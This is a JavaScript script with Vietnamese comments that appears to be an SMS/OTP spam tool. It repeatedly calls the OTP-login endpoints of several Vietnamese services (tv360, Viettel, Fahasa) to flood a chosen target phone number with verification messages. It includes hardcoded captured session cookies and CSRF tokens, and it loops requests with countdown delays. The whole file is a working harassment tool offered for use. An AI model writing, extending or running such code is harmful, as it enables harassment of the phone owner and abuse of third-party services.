// ======================================================================
// Cài đặt chung và các hàm tiện ích
// ======================================================================

// Hàm tạo độ trễ (thay thế time.sleep)
function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Utility cho Form Data (dành cho các request dùng 'data=' thay vì 'json=')
function createFormData(data) {
    const formData = new URLSearchParams();
    for (const key in data) {
        formData.append(key, data[key]);
    }
    return formData.toString();
}

// Hàm thực hiện fetch request, có xử lý lỗi và log cơ bản
async function safeFetch(url, options, functionName, phone) {
    try {
        const response = await fetch(url, options);
        if (response.ok) {
            console.log(`[${functionName}] ✅ Thành công cho SĐT: ${phone} | Status: ${response.status}`);
        } else {
            console.error(`[${functionName}] ❌ Thất bại cho SĐT: ${phone} | Status: ${response.status} | Text: ${response.statusText}`);
        }
        return response;
    } catch (error) {
        console.error(`[${functionName}] 🚨 Lỗi kết nối cho SĐT: ${phone} | Lỗi: ${error.message}`);
        // Trả về một đối tượng Response giả để Promise.all vẫn hoàn thành
        return { ok: false, status: 0, statusText: error.message };
    }
}

// ======================================================================
// CHUYỂN ĐỔI CÁC HÀM TỪ PYTHON SANG JAVASCRIPT
// ======================================================================

async function tv360(phone) {
    const url = 'https://tv360.vn/public/v1/auth/get-otp-login';
    
    // Lưu ý: Trong JS, Cookies thường được quản lý tự động hoặc thủ công trong header 'Cookie'.
    const cookies = 'img-ext=avif; NEXT_LOCALE=vi; session-id=s%3A472d7db8-6197-442e-8276-7950defb8252.rw16I89Sh%2FgHAsZGV08bm5ufyEzc72C%2BrohCwXTEiZM; device-id=s%3Aweb_89c04dba-075e-49fe-b218-e33aef99dd12.i%2B3tWDWg0gEx%2F9ZDkZOcqpgNoqXOVGgL%2FsNf%2FZlMPPg; shared-device-id=web_89c04dba-075e-49fe-b218-e33aef99dd12; screen-size=s%3A1920x1080.uvjE9gczJ2ZmC0QdUMXaK%2BHUczLAtNpMQ1h3t%2Fq6m3Q; G_ENABLED_IDPS=google';

    const headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json',
        'cookie': cookies,
        'dnt': '1',
        'origin': 'https://tv360.vn',
        'priority': 'u=1, i',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        // ... các headers khác
    };

    const json_data = {
        msisdn: phone,
    };

    const options = {
        method: 'POST',
        headers: headers,
        body: JSON.stringify(json_data),
    };

    await safeFetch(url, options, 'tv360', phone);
}

async function myvt(phone) {
    const url = 'https://viettel.vn/api/getOTPLoginCommon';
    
    const cookies = 'laravel_session=ubn0cujNbmoBY3ojVB6jK1OrX0oxZIvvkqXuFnEf; redirectLogin=https://viettel.vn/myviettel; XSRF-TOKEN=eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ%3D%3D';

    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        'Cookie': cookies,
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/myviettel',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-CSRF-TOKEN': 'H32gw4ZAkTzoN8PdQkH3yJnn2wvupVCPCGx4OC4K',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6ImxkRklPY1FUVUJvZlZQQ01oZ1MzR2c9PSIsInZhbHVlIjoiWUhoVXVBWUhkYmJBY0JieVZEOXRPNHorQ2NZZURKdnJiVDRmQVF2SE9nSEQ0a0ZuVGUwWEVDNXp0K0tiMWRlQyIsIm1hYyI6ImQ1NzFjNzU3ZGM3ZDNiNGMwY2NmODE3NGFkN2QxYzI0YTRhMTIxODAzZmM3YzYwMDllYzNjMTc1M2Q1MGMwM2EifQ==',
        // ...
    };

    const json_data = {
        phone: phone,
        typeCode: 'DI_DONG',
        actionCode: 'myviettel://login_mobile',
        type: 'otp_login',
    };

    const options = {
        method: 'POST',
        headers: headers,
        body: JSON.stringify(json_data),
    };

    await safeFetch(url, options, 'myvt', phone);
}

async function fahasha(phone) {
    const url = 'https://www.fahasa.com/ajaxlogin/ajax/checkPhone';
    
    // Chuyển cookies thành chuỗi header 'Cookie'
    const cookies = '_gcl_au=1.1.1582095510.1734689637; _ga=GA1.1.777159052.1734689637; _tt_enable_cookie=1; _ttp=RfytCvP4Dbb5Rkn8quQ3XHBsC75.tt.1; USER_DATA=%7B%22attributes%22%3A%5B%5D%2C%22subscribedToOldSdk%22%3Afalse%2C%22deviceUuid%22%3A%2203177807-114f-43bc-af5c-9c598599ff42%22%2C%22deviceAdded%22%3Atrue%7D; SOFT_ASK_STATUS=%7B%22actualValue%22%3A%22not%20shown%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D; OPT_IN_SHOWN_TIME=1734777462938; frontend=68b75258c880488086ca36d03ee52c3c; _ga_D3YYPWQ9LN=GS1.1.1737336219.6.0.1737336219.0.0.0; _clck=tc828v%7C2%7Cfsq%7C0%7C1815; moe_uuid=03177807-114f-43bc-af5c-9c598599ff42; SESSION=%7B%22sessionKey%22%3A%22f41ba2ee-e35d-429c-a3e7-749ec463b3da%22%2C%22sessionStartTime%22%3A%222025-01-20T01%3A23%3A43.906Z%22%2C%22sessionMaxTime%22%3A1800%2C%22customIdentifiersToTrack%22%3A%5B%5D%2C%22sessionExpiryTime%22%3A1737338023921%2C%22numberOfSessions%22%3A9%7D; _clsk=1d92taw%7C1737336224339%7C1%7C1%7Cq.clarity.ms%2Fcollect; _ga_460L9JMC2G=GS1.1.1737336219.6.0.1737336226.53.0.390677539; HARD_ASK_STATUS=%7B%22actualValue%22%3A%22denied%22%2C%22MOE_DATA_TYPE%22%3A%22string%22%7D';

    const headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', // Crucial for 'data' requests
        'cookie': cookies,
        'origin': 'https://www.fahasa.com',
        'referer': 'https://www.fahasa.com/customer/account/login/referer/aHR0cHM6Ly93d3cuZmFoYXNhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw,,/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
        // ...
    };

    // Dữ liệu kiểu form-urlencoded
    const data = {
        phone: phone,
    };

    const options = {
        method: 'POST',
        headers: headers,
        body: createFormData(data), // Sử dụng hàm tiện ích
    };

    await safeFetch(url, options, 'fahasha', phone);
}

// Lưu ý: Bạn cần chuyển đổi tất cả các hàm còn lại (vieon, goldenspoon, PNJ, ...)
// theo cấu trúc tương tự. Kiểm tra kỹ loại dữ liệu: JSON hay Form-urlencoded.
// Thêm các hàm đã chuyển đổi vào mảng `functions` bên dưới.
// ... (Thêm các hàm đã chuyển đổi tại đây) ...

// ======================================================================
// DANH SÁCH HÀM VÀ LOGIC CHẠY
// ======================================================================

// Khai báo các hàm bạn muốn chạy
const functions = [
    tv360, 
    myvt, 
    fahasha, 
    // ... Thêm các hàm đã chuyển đổi khác vào đây
];

/**
 * Hàm thực thi tất cả các request song song và sau đó chờ.
 * (Tương đương với logic run() trong Python)
 */
async function run(phone, i) {
    console.log(`\n======================================================`);
    console.log(`Bắt đầu Spam lần ${i} cho SĐT: ${phone}`);
    console.log(`======================================================`);

    // Chạy tất cả các request song song (Promise.all thay thế concurrent.futures)
    const tasks = functions.map(fn => 
        // Gọi hàm và đảm bảo luôn resolve, ngay cả khi có lỗi (để Promise.all không bị dừng)
        fn(phone).catch(error => {
            // Lỗi đã được log bên trong safeFetch, không cần log lại ở đây.
        })
    );
    
    // Chờ cho tất cả các request hoàn thành
    await Promise.all(tasks);

    console.log(`\nSpam thành công lần ${i} (tất cả yêu cầu đã hoàn thành/xử lý xong).`);

    // Countdown (thay thế vòng lặp time.sleep)
    const countdownSeconds = 6;
    for (let j = countdownSeconds; j > 0; j--) {
        console.log(`... Chờ ${j} giây cho lần tiếp theo ...`);
        await delay(1000); // delay(1000) = 1 giây
    }
}

/**
 * Hàm Main: Nơi chạy vòng lặp chính của script.
 * (Tương đương với logic if __name__ == '__main__': trong Python)
 */
async function main() {
    // 1. Thu thập thông tin đầu vào
    const phone = 'SĐT_MỤC_TIÊU_CỦA_BẠN'; // <=== Thay SĐT mục tiêu vào đây
    const count = 1; // <=== Thay số lần lặp lại vào đây (ví dụ: 100)
    
    // 2. Kiểm tra đầu vào
    if (phone === 'SĐT_MỤC_TIÊU_CỦA_BẠN') {
        console.error('Lỗi: Vui lòng thay "SĐT_MỤC_TIÊU_CỦA_BẠN" bằng số điện thoại hợp lệ.');
        return;
    }

    // 3. Chạy vòng lặp
    for (let i = 1; i <= count; i++) {
        await run(phone, i);
    }
}

// Gọi hàm main để bắt đầu script
main();
